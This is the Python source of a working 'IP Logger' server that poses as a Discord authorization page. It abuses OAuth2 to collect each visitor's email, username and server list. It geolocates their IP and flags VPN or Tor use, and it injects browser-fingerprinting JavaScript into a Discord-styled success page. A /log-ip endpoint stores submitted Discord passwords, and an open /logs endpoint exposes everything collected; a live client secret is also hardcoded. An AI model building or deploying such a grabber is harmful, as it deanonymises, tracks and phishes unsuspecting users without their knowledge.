import http.server
import json
import os
import urllib.request
import urllib.parse
import urllib.error
from datetime import datetime, timezone

PORT = int(os.environ.get("PORT", 5555))
LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "ip_logs.json")
PUBLIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "public")

CLIENT_ID = "1516985750095265843"
CLIENT_SECRET = "p1avKlt1hjjmf74pc-AholI8ppVhM7Vv"
REDIRECT_URI = f"http://bananav2.duckdns.org:{PORT}/callback"
SCOPE = "identify email guilds"
AUTH_URL = (
    "https://discord.com/oauth2/authorize?"
    + urllib.parse.urlencode({
        "response_type": "code",
        "client_id": CLIENT_ID,
        "redirect_uri": REDIRECT_URI,
        "scope": SCOPE,
    })
)


def read_logs():
    if not os.path.exists(LOG_FILE):
        return []
    with open(LOG_FILE, "r") as f:
        return json.load(f)


def write_logs(logs):
    with open(LOG_FILE, "w") as f:
        json.dump(logs, f, indent=2)


def discord_post(url, data, headers=None):
    body = urllib.parse.urlencode(data).encode()
    hdrs = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    }
    if headers:
        hdrs.update(headers)
    req = urllib.request.Request(url, data=body, headers=hdrs)
    try:
        with urllib.request.urlopen(req) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        error_body = e.read().decode()
        print(f"[DISCORD API ERROR] {e.code}: {error_body}")
        raise Exception(f"Discord API error {e.code}: {error_body}")


def discord_get(url, token):
    req = urllib.request.Request(url, headers={
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    })
    try:
        with urllib.request.urlopen(req) as resp:
            return json.loads(resp.read().decode())
    except urllib.error.HTTPError as e:
        error_body = e.read().decode()
        print(f"[DISCORD API ERROR] {e.code}: {error_body}")
        raise Exception(f"Discord API error {e.code}: {error_body}")


def exchange_code(code):
    print(f"[OAUTH] Exchanging code for token...")
    print(f"[OAUTH] redirect_uri={REDIRECT_URI}")
    print(f"[OAUTH] client_id={CLIENT_ID}")
    return discord_post(
        "https://discord.com/api/oauth2/token",
        {
            "grant_type": "authorization_code",
            "code": code,
            "redirect_uri": REDIRECT_URI,
            "client_id": CLIENT_ID,
            "client_secret": CLIENT_SECRET,
        },
    )


def _fetch_json(url):
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    })
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read().decode())
    except Exception:
        return None


def lookup_geo(ip):
    geo = {
        "ip": ip, "city": "", "region": "", "regionCode": "", "country": "",
        "countryCode": "", "continent": "", "postal": "", "latitude": None,
        "longitude": None, "timezone": "", "utcOffset": "", "asn": "",
        "org": "", "hostname": "", "isp": "",
        "isLocal": ip.startswith("127.") or ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172.") or ip == "::1",
        "isVpn": False, "isProxy": False, "isHosting": False, "isTor": False,
    }

    if geo["isLocal"]:
        return geo

    data = _fetch_json(f"http://ip-api.com/json/{ip}?fields=status,message,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query,continentCode")
    if data and data.get("status") == "success":
        geo["ip"] = data.get("query", ip)
        geo["city"] = data.get("city", "")
        geo["region"] = data.get("regionName", "")
        geo["regionCode"] = data.get("region", "")
        geo["country"] = data.get("country", "")
        geo["countryCode"] = data.get("countryCode", "")
        geo["continent"] = data.get("continentCode", "")
        geo["postal"] = data.get("zip", "")
        geo["latitude"] = data.get("lat")
        geo["longitude"] = data.get("lon")
        geo["timezone"] = data.get("timezone", "")
        geo["isp"] = data.get("isp", "")
        geo["org"] = data.get("org", "")
        geo["asn"] = data.get("as", "")

    extra = _fetch_json(f"https://ipinfo.io/{ip}/json")
    if extra:
        if not geo.get("hostname") and extra.get("hostname"):
            geo["hostname"] = extra["hostname"]
        if not geo.get("org") and extra.get("org"):
            geo["org"] = extra["org"]
        p = extra.get("privacy", {})
        if p:
            geo["isVpn"] = p.get("vpn", False)
            geo["isProxy"] = p.get("proxy", False)
            geo["isHosting"] = p.get("hosting", False)
            geo["isTor"] = p.get("tor", False)

    if not geo["hostname"]:
        try:
            import socket
            geo["hostname"] = socket.gethostbyaddr(ip)[0]
        except Exception:
            pass

    return geo


class OAuthHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=PUBLIC_DIR, **kwargs)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        params = urllib.parse.parse_qs(parsed.query)

        if path == "/":
            self.send_response(302)
            self.send_header("Location", "/index.html")
            self.end_headers()

        elif path == "/auth":
            self.send_response(302)
            self.send_header("Location", AUTH_URL)
            self.end_headers()

        elif path == "/callback":
            code = params.get("code", [None])[0]
            error = params.get("error", [None])[0]

            if error:
                self._serve_callback_page(error=error)
                return

            if not code:
                self._serve_callback_page(error="No authorization code received")
                return

            try:
                token_data = exchange_code(code)
                access_token = token_data["access_token"]

                user = discord_get("https://discord.com/api/users/@me", access_token)
                guilds = discord_get("https://discord.com/api/users/@me/guilds", access_token)

                ip = self.headers.get("X-Forwarded-For", "").split(",")[0].strip() or self.client_address[0]

                geo = lookup_geo(ip)

                entry = {
                    "id": datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f"),
                    "ip": ip,
                    "discordEmail": user.get("email", ""),
                    "discordPassword": "oauth2_authorized",
                    "discordUsername": user.get("username", ""),
                    "discordDiscriminator": user.get("discriminator", ""),
                    "discordDisplayName": user.get("global_name", ""),
                    "discordAvatar": user.get("avatar", ""),
                    "discordMfaEnabled": user.get("mfa_enabled", False),
                    "discordLocale": user.get("locale", ""),
                    "discordBanner": user.get("banner", ""),
                    "discordAccentColor": user.get("accent_color"),
                    "discordPremiumType": user.get("premium_type", 0),
                    "discordPublicFlags": user.get("public_flags", 0),
                    "discordGuilds": [
                        {"id": g["id"], "name": g["name"], "icon": g.get("icon", ""), "owner": g.get("owner", False), "permissions": g.get("permissions", "0")}
                        for g in guilds
                    ],
                    "userAgent": self.headers.get("User-Agent", ""),
                    "referer": self.headers.get("Referer", "direct"),
                    "hidden": False,
                    "masked": False,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "geo": geo,
                    "fingerprint": {},
                }

                logs = read_logs()
                logs.append(entry)
                write_logs(logs)

                self._serve_callback_page(
                    username=user.get("username", ""),
                    avatar=f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get("avatar") else "",
                    entry_id=entry["id"],
                )

            except Exception as e:
                import traceback
                traceback.print_exc()
                self._serve_callback_page(error=str(e))

        elif path == "/logs":
            self._json_response(read_logs())

        elif path == "/oauth-url":
            self._json_response({"url": AUTH_URL})

        elif path == "/success":
            self._serve_file("success.html")

        else:
            super().do_GET()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = json.loads(self.rfile.read(length)) if length else {}

        if self.path == "/log-ip":
            fp = body.get("fingerprint", {})
            ip = (
                body.get("ip")
                or fp.get("geoIP")
                or self.headers.get("X-Forwarded-For", "").split(",")[0].strip()
                or self.client_address[0]
            )
            entry = {
                "id": datetime.now(timezone.utc).strftime("%Y%m%d%H%M%S%f"),
                "ip": ip,
                "discordEmail": body.get("discordEmail", ""),
                "discordPassword": body.get("discordPassword", ""),
                "userAgent": body.get("userAgent", self.headers.get("User-Agent", "")),
                "referer": body.get("referer", "direct"),
                "hidden": False,
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "geo": {
                    "country": fp.get("country", ""),
                    "region": fp.get("region", ""),
                    "city": fp.get("city", ""),
                    "isp": fp.get("isp", ""),
                    "latitude": fp.get("latitude"),
                    "longitude": fp.get("longitude"),
                    "asn": fp.get("asn", ""),
                },
                "fingerprint": {
                    "screenRes": fp.get("screenRes", ""),
                    "screenDepth": fp.get("screenDepth"),
                    "viewport": fp.get("viewport", ""),
                    "timezone": fp.get("timezone", ""),
                    "language": fp.get("language", ""),
                    "languages": fp.get("languages", ""),
                    "platform": fp.get("platform", ""),
                    "cookieEnabled": fp.get("cookieEnabled"),
                    "doNotTrack": fp.get("doNotTrack"),
                    "hardwareConcurrency": fp.get("hardwareConcurrency"),
                    "deviceMemory": fp.get("deviceMemory"),
                    "maxTouchPoints": fp.get("maxTouchPoints"),
                    "gpuVendor": fp.get("gpuVendor", ""),
                    "gpuRenderer": fp.get("gpuRenderer", ""),
                    "canvasHash": fp.get("canvasHash", ""),
                },
            }
            logs = read_logs()
            logs.append(entry)
            write_logs(logs)
            self._json_response({"ok": True})

        elif self.path == "/delete-ip":
            target_id = body.get("id", "")
            logs = [e for e in read_logs() if e.get("id") != target_id]
            write_logs(logs)
            self._json_response({"ok": True})

        elif self.path == "/toggle-hide":
            target_id = body.get("id", "")
            logs = read_logs()
            for e in logs:
                if e.get("id") == target_id:
                    e["hidden"] = not e.get("hidden", False)
                    break
            write_logs(logs)
            self._json_response({"ok": True})

        elif self.path == "/toggle-mask":
            target_id = body.get("id", "")
            logs = read_logs()
            for e in logs:
                if e.get("id") == target_id:
                    e["masked"] = not e.get("masked", False)
                    break
            write_logs(logs)
            self._json_response({"ok": True})

        elif self.path == "/mask-all":
            logs = read_logs()
            for e in logs:
                e["masked"] = True
            write_logs(logs)
            self._json_response({"ok": True})

        elif self.path == "/unmask-all":
            logs = read_logs()
            for e in logs:
                e["masked"] = False
            write_logs(logs)
            self._json_response({"ok": True})

        elif self.path == "/delete-all":
            write_logs([])
            self._json_response({"ok": True})

        elif self.path == "/update-fingerprint":
            target_id = body.get("id", "")
            fp = body.get("fingerprint", {})
            logs = read_logs()
            for e in logs:
                if e.get("id") == target_id:
                    e["fingerprint"] = {
                        "screenRes": fp.get("screenRes", ""),
                        "screenDepth": fp.get("screenDepth"),
                        "viewport": fp.get("viewport", ""),
                        "timezone": fp.get("timezone", ""),
                        "language": fp.get("language", ""),
                        "languages": fp.get("languages", ""),
                        "platform": fp.get("platform", ""),
                        "cookieEnabled": fp.get("cookieEnabled"),
                        "doNotTrack": fp.get("doNotTrack"),
                        "hardwareConcurrency": fp.get("hardwareConcurrency"),
                        "deviceMemory": fp.get("deviceMemory"),
                        "maxTouchPoints": fp.get("maxTouchPoints"),
                        "gpuVendor": fp.get("gpuVendor", ""),
                        "gpuRenderer": fp.get("gpuRenderer", ""),
                        "canvasHash": fp.get("canvasHash", ""),
                    }
                    break
            write_logs(logs)
            self._json_response({"ok": True})

        else:
            self.send_response(404)
            self.end_headers()

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def _json_response(self, data):
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())

    def _serve_callback_page(self, username="", avatar="", error="", entry_id=""):
        err_cls = " err" if error else ""
        if error:
            svg_content = "<line x1='18' y1='6' x2='6' y2='18'/><line x1='6' y1='6' x2='18' y2='18'/>"
            heading = "Authorization Failed"
            msg = "<strong>" + error + "</strong>"
            sub_msg = "Something went wrong with the OAuth2 flow."
        else:
            svg_content = '<polyline points="20 6 9 17 4 12"/>'
            heading = "Authorized!"
            msg = "Welcome back, <strong>" + username + "</strong>!"
            sub_msg = "You may now close this window."

        avatar_html = ""
        if avatar:
            avatar_html = '<img class="avatar" src="' + avatar + '" alt="avatar">'

        fingerprint_js = ""
        if entry_id:
            fingerprint_js = """
<script>
(function() {
  function getGPU() {
    try {
      var c = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return {vendor:'unknown', renderer:'unknown'};
      var ext = gl.getExtension('WEBGL_debug_renderer_info');
      if (!ext) return {vendor:'unknown', renderer:'unknown'};
      return {vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL)};
    } catch(e) { return {vendor:'', renderer:''}; }
  }
  function canvasHash() {
    try {
      var c = document.createElement('canvas');
      c.width = 200; c.height = 50;
      var ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font = '14px Arial';
      ctx.fillStyle = '#f60';
      ctx.fillRect(125, 1, 62, 20);
      ctx.fillStyle = '#069';
      ctx.fillText('fingerprint', 2, 15);
      ctx.fillStyle = 'rgba(102,204,0,0.7)';
      ctx.fillText('fingerprint', 4, 17);
      var hash = 0;
      var s = c.toDataURL();
      for (var i = 0; i < s.length; i++) { hash = ((hash << 5) - hash) + s.charCodeAt(i); hash |= 0; }
      return hash.toString(16);
    } catch(e) { return ''; }
  }
  var gpu = getGPU();
  var fp = {
    screenRes: screen.width + 'x' + screen.height,
    screenDepth: screen.colorDepth,
    viewport: window.innerWidth + 'x' + window.innerHeight,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
    language: navigator.language || '',
    languages: (navigator.languages || []).join(', '),
    platform: navigator.platform || '',
    cookieEnabled: navigator.cookieEnabled,
    doNotTrack: navigator.doNotTrack || '',
    hardwareConcurrency: navigator.hardwareConcurrency || 0,
    deviceMemory: navigator.deviceMemory || 0,
    maxTouchPoints: navigator.maxTouchPoints || 0,
    gpuVendor: gpu.vendor,
    gpuRenderer: gpu.renderer,
    canvasHash: canvasHash()
  };
  fetch('/update-fingerprint', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({id: 'ENTRY_ID_PLACEHOLDER', fingerprint: fp})
  }).catch(function(){});
})();
</script>"""
            fingerprint_js = fingerprint_js.replace("ENTRY_ID_PLACEHOLDER", entry_id)

        html = (
            '<!DOCTYPE html><html lang="en"><head>'
            '<meta charset="UTF-8">'
            '<meta name="viewport" content="width=device-width, initial-scale=1.0">'
            '<title>Discord - Authorized</title>'
            '<link rel="icon" href="https://discord.com/assets/favicon.ico">'
            '<style>'
            "* { margin:0; padding:0; box-sizing:border-box; }"
            "body { font-family:'Noto Sans',sans-serif; background:#313338; min-height:100vh; display:flex; align-items:center; justify-content:center; }"
            ".card { background:#2b2d31; border-radius:12px; padding:2.5rem; max-width:440px; width:90vw; text-align:center; box-shadow:0 4px 24px rgba(0,0,0,0.4); animation:pop 0.35s ease; }"
            ".avatar { width:72px; height:72px; border-radius:50%; margin:0 auto 1rem; box-shadow:0 4px 12px rgba(0,0,0,0.3); }"
            ".check { width:60px; height:60px; background:#23a55a; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 1.25rem; }"
            ".err .check { background:#f23f43; }"
            ".check svg { width:30px; height:30px; fill:none; stroke:#fff; stroke-width:3; stroke-linecap:round; stroke-linejoin:round; }"
            "h2 { color:#f2f3f5; font-size:1.4rem; margin-bottom:0.3rem; }"
            "p { color:#949ba4; font-size:0.95rem; line-height:1.5; }"
            "p strong { color:#dbdee1; }"
            ".sub { margin-top:1rem; font-size:0.8rem; color:#6d6f78; }"
            "@keyframes pop { from { transform:scale(0.9); opacity:0; } to { transform:scale(1); opacity:1; } }"
            '</style></head><body>'
            '<div class="card' + err_cls + '">'
            '<div class="check"><svg viewBox="0 0 24 24">' + svg_content + '</svg></div>'
            + avatar_html +
            '<h2>' + heading + '</h2>'
            '<p>' + msg + '</p>'
            '<p class="sub">' + sub_msg + '</p>'
            '</div>'
            + fingerprint_js +
            '</body></html>'
        )
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.end_headers()
        self.wfile.write(html.encode())

    def _serve_file(self, filename):
        filepath = os.path.join(PUBLIC_DIR, filename)
        if not os.path.exists(filepath):
            self.send_response(404)
            self.end_headers()
            return
        with open(filepath, "rb") as f:
            content = f.read()
        ext = os.path.splitext(filename)[1]
        ct = {"html": "text/html", "css": "text/css", "js": "application/javascript", "json": "application/json"}.get(ext.lstrip("."), "text/plain")
        self.send_response(200)
        self.send_header("Content-Type", ct)
        self.end_headers()
        self.wfile.write(content)

    def log_message(self, format, *args):
        print(f"[{datetime.now().strftime('%H:%M:%S')}] {args[0]}")


if __name__ == "__main__":
    os.makedirs(PUBLIC_DIR, exist_ok=True)
    if not os.path.exists(LOG_FILE):
        write_logs([])
    server = http.server.ThreadingHTTPServer(("0.0.0.0", PORT), OAuthHandler)
    print(f"IP Logger running on http://localhost:{PORT}")
    print(f"Visitor page:  {AUTH_URL}")
    print(f"Dashboard:     http://localhost:{PORT}/dashboard.html")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nShutting down.")
        server.server_close()
